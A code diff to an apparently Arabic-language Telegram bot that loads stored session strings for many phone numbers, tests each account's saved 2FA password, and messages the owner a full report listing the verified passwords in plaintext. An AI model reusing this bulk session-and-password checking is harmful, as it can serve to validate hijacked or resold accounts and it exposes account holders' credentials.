@@ -144,14 +144,24 @@ async def _handle_callback_group_03(update, context, q, data, user, is_own, is_s
                 parallel_limit = 5
                 slots = asyncio.Semaphore(parallel_limit)
                 progress_lock = asyncio.Lock()
+                status_lock = asyncio.Lock()
+                statuses = {}
+                recent_results = []
                 processed = 0
 
                 async def _update_progress():
                     nonlocal processed
                     async with progress_lock:
                         processed += 1
-                        if processed % 5 != 0 and processed != len(_rows):
-                            return
+                        async with status_lock:
+                            active = [
+                                phone for phone, status in statuses.items()
+                                if status.startswith("⏳")
+                            ]
+                            recent = list(recent_results[-12:])
+                        recent_text = "\n".join(
+                            f"• {phone}: {status}" for phone, status in recent
+                        )
                         try:
                             await context.bot.edit_message_text(
                                 chat_id=q.message.chat_id,
@@ -164,6 +174,8 @@ async def _handle_callback_group_03(update, context, q, data, user, is_own, is_s
                                     f"❌ غير مطابق: *{len(invalid)}* | "
                                     f"ℹ️ بدون 2FA: *{len(no_2fa)}*\n\n"
                                     f"⚡ يعمل بالتوازي ({parallel_limit} حسابات).\n"
+                                    f"⏳ قيد الفحص الآن: {', '.join(active) or 'لا يوجد'}\n\n"
+                                    f"*آخر النتائج الفردية:*\n{recent_text}\n\n"
                                     "لن يتم تغيير أي كلمة مرور أثناء الفحص."
                                 ),
                                 parse_mode=ParseMode.MARKDOWN,
@@ -182,6 +194,9 @@ async def _handle_callback_group_03(update, context, q, data, user, is_own, is_s
                         phone = rec["phone_number"]
                         saved_pwd = (rec["twofa_password"] or "").strip()
                         cli = None
+                        result_status = None
+                        async with status_lock:
+                            statuses[phone] = "⏳ جارٍ التحقق..."
                         try:
                             cli = TelegramClient(
                                 StringSession(rec["session_string"]),
@@ -191,6 +206,7 @@ async def _handle_callback_group_03(update, context, q, data, user, is_own, is_s
                             await asyncio.wait_for(cli.connect(), timeout=20)
                             if not await asyncio.wait_for(cli.is_user_authorized(), timeout=10):
                                 failed.append(f"{phone}: الجلسة منتهية")
+                                result_status = "⚠️ الجلسة منتهية"
                                 return
 
                             pwd_state = await asyncio.wait_for(
@@ -198,8 +214,10 @@ async def _handle_callback_group_03(update, context, q, data, user, is_own, is_s
                             )
                             if not pwd_state.has_password:
                                 no_2fa.append(phone)
+                                result_status = "ℹ️ بدون 2FA"
                             elif not saved_pwd:
                                 missing.append(f"{phone}: 2FA موجودة لكن الكلمة غير محفوظة")
+                                result_status = "⚠️ كلمة 2FA غير محفوظة"
                             else:
                                 result = await asyncio.wait_for(
                                     verify_current_2fa_password(
@@ -210,20 +228,27 @@ async def _handle_callback_group_03(update, context, q, data, user, is_own, is_s
                                 if result is True:
                                     safe_pwd = saved_pwd.replace("`", "")
                                     verified.append(f"{phone}: `{safe_pwd}`")
+                                    result_status = "✅ صحيحة — كلمة 2FA مطابقة"
                                 elif result is False:
                                     invalid.append(
                                         f"{phone}: كلمة 2FA المحفوظة غير صحيحة"
                                     )
+                                    result_status = "❌ غير مطابقة"
                                 else:
                                     failed.append(f"{phone}: تعذر التحقق حالياً")
+                                    result_status = "⚠️ تعذر التحقق حالياً"
                         except Exception as _scan_e:
                             failed.append(f"{phone}: {str(_scan_e)[:90]}")
+                            result_status = f"⚠️ فشل: {str(_scan_e)[:60]}"
                         finally:
                             try:
                                 if cli:
                                     await cli.disconnect()
                             except Exception:
                                 pass
+                            async with status_lock:
+                                statuses[phone] = result_status or "⚠️ لم تظهر نتيجة"
+                                recent_results.append((phone, statuses[phone]))
                             await _update_progress()
 
                 try:
@@ -237,37 +262,56 @@ async def _handle_callback_group_03(update, context, q, data, user, is_own, is_s
                         f"❌ كلمة غير صحيحة: *{len(invalid)}*",
                         f"ℹ️ بدون 2FA: *{len(no_2fa)}*",
                         f"⚠️ تعذر الفحص: *{len(failed)}*",
+                        "\n📋 *نتيجة كل رقم:*",
                     ]
+                    report.extend(
+                        f"• {rec['phone_number']}: "
+                        f"{statuses.get(rec['phone_number'], '⚠️ لم تظهر نتيجة')}"
+                        for rec in _rows
+                    )
                     if verified:
                         report.append(
                             "\n✅ الحسابات المتحقق منها وكلماتها:\n"
-                            + "\n".join(f"• {item}" for item in verified[:30])
+                            + "\n".join(f"• {item}" for item in verified)
                         )
                     if missing:
                         report.append(
                             "\n⚠️ تحتاج كلمة 2FA يدوية:\n"
-                            + "\n".join(f"• {item}" for item in missing[:30])
+                            + "\n".join(f"• {item}" for item in missing)
                         )
                     if invalid:
                         report.append(
                             "\n❌ القيم غير المطابقة — لم يتم تغييرها:\n"
-                            + "\n".join(f"• {item}" for item in invalid[:30])
+                            + "\n".join(f"• {item}" for item in invalid)
                         )
                     if no_2fa:
                         report.append(
                             "\nℹ️ لا يوجد 2FA:\n"
-                            + "\n".join(f"• {item}" for item in no_2fa[:30])
+                            + "\n".join(f"• {item}" for item in no_2fa)
                         )
                     if failed:
                         report.append(
                             "\n⚠️ تحتاج إعادة فحص:\n"
-                            + "\n".join(f"• {item}" for item in failed[:30])
+                            + "\n".join(f"• {item}" for item in failed)
                         )
-                    await context.bot.send_message(
-                        OWNER_ID,
-                        "\n".join(report),
-                        parse_mode=ParseMode.MARKDOWN,
-                    )
+                    report_chunks, current_chunk = [], []
+                    current_length = 0
+                    for line in report:
+                        line_length = len(line) + 1
+                        if current_chunk and current_length + line_length > 3500:
+                            report_chunks.append("\n".join(current_chunk))
+                            current_chunk = []
+                            current_length = 0
+                        current_chunk.append(line)
+                        current_length += line_length
+                    if current_chunk:
+                        report_chunks.append("\n".join(current_chunk))
+                    for chunk in report_chunks:
+                        await context.bot.send_message(
+                            OWNER_ID,
+                            chunk,
+                            parse_mode=ParseMode.MARKDOWN,
+                        )
                 finally:
                     context.user_data["unread_2fa_scan_running"] = False
 
